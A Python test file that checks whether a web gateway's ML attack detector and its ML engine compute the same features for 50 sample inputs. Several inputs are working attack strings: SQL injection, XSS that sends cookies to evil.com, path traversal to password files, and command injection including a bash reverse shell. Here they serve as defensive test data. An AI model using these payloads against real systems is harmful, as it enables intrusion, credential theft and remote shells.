import sys
from pathlib import Path
import pytest
import numpy as np

# Ensure ml-engine is accessible
for candidate in [
    Path(__file__).resolve().parents[3] / "ml-engine",
    Path("ml-engine").resolve(),
]:
    if candidate.exists() and str(candidate) not in sys.path:
        sys.path.insert(0, str(candidate))

from features.extractor import CANONICAL_FEATURE_NAMES, extract_17_vector
from app.security.ml_detector import MLDetector, FEATURE_NAMES

SAMPLE_PAYLOADS = [
    "GET /api/v1/books HTTP/1.1",
    "q=harry+potter&page=1&limit=20",
    "name=John Doe&email=john.doe@example.com",
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
    "{\"title\": \"Clean Architecture\", \"author\": \"Robert C. Martin\", \"price\": 39.99}",
    "category=computer-science&sort=desc",
    "username=admin_user&role=reader",
    "https://api.bookie.local/v1/health?check=deep",
    "Accept: application/json, text/plain, */*",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "' UNION SELECT null, null, null--",
    "1' OR '1'='1",
    "admin' --",
    "1; DROP TABLE users;--",
    "' UNION SELECT username, password FROM accounts--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "' OR 1=1 ORDER BY 1--",
    "1' WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('whoami');--",
    "SELECT * FROM information_schema.tables WHERE table_schema='public'",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "javascript:prompt('PBL6')",
    "<body onload=document.location='http://evil.com/steal?c='+document.cookie>",
    "<input autofocus onfocus=alert(1)>",
    "\"><script src=https://evil.com/hook.js></script>",
    "<a href=\"javascript:void(0)\" onclick=\"evil()\">Click</a>",
    "<details open ontoggle=alert(1)>",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "/var/log/../../etc/passwd%00.png",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/api/files?download=../../../../etc/hosts",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "file:///etc/passwd",
    "/proc/self/environ",
    "; whoami",
    "| cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "& ping -c 4 127.0.0.1 &",
    "127.0.0.1; uname -a",
    "| net user /domain",
    "; sleep 10",
    "|| bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
    "& echo vulnerable &"
]

def test_feature_names_parity():
    """Verifies that gateway FEATURE_NAMES matches canonical ML Engine 17 features 100%."""
    assert len(FEATURE_NAMES) == 17
    assert FEATURE_NAMES == CANONICAL_FEATURE_NAMES

def test_vector_parity_across_50_samples():
    """Verifies 100% vector equality between Gateway inference and ML Engine across 50 samples."""
    assert len(SAMPLE_PAYLOADS) == 50

    for idx, payload in enumerate(SAMPLE_PAYLOADS):
        gw_vector = MLDetector.extract_features(payload)
        ml_vector = extract_17_vector(payload, normalize=False).tolist()

        assert len(gw_vector) == 17
        assert len(ml_vector) == 17
        np.testing.assert_allclose(
            gw_vector,
            ml_vector,
            rtol=1e-5,
            atol=1e-5,
            err_msg=f"Feature skew detected on sample #{idx}: {payload!r}"
        )
